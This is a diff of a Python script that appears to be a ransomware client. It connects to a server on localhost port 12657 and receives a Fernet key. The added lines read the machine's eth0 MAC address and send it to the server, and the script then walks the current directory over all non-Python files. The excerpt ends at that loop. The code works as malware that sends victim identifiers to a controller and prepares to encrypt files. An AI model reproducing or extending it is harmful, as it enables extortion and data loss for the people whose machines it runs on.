@@ -1,16 +1,24 @@
-import socket
-import subprocess
-import os
+import socket, subprocess, os, psutil,platform, tkinter as tk
 from cryptography.fernet import Fernet
-import tkinter as tk
 from tkinter import messagebox
 SERVER="localhost"
 PORT=12657
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((SERVER, PORT))
+client.settimeout(5)
 print("Connected")
 key = client.recv(1024)
 fernet = Fernet(key)
+
+def get_mac(fam):
+    for interface,snics in psutil.net_if_addrs().items():
+        for snic in snics:
+            if snic.family==fam:
+                yield (interface,(snic.address))
+if platform.system()=="Linux":
+    res=dict(get_mac(psutil.AF_LINK))
+    eth_interface=bytes(res['eth0'].encode())
+    client.send(eth_interface)
 for dir_tuple in os.walk(os.getcwd()):
     for file in dir_tuple[2]:
         if not file.endswith('py'):
